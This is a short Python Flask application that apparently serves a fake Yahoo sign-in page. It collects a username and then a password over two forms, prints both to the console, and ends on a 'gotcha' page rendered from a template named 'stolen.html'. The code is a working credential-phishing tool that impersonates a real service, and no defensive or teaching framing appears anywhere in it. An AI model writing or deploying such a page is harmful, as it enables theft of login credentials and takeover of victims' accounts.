from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/login.yahoo.com', methods=['GET', 'POST'])
def login():
    import flask
    if request.method == 'POST':
        username = request.form.get('username')
        print(f'Username: {username}')
        return flask.redirect(flask.url_for('password', email=username))
    return render_template('yahoo.html')

@app.route('/password', methods=['GET', 'POST'])
def password():
    import flask
    if request.method == 'POST':
        password = request.form.get('password')
        # Process the password as needed
        print(f'Password: {password}')
        return flask.redirect(flask.url_for('gotcha'))
    email = request.args.get('email')
    return render_template('plm.html', email=email)

@app.route(f'/gotcha', methods=['GET'])
def gotcha():
    return render_template('stolen.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
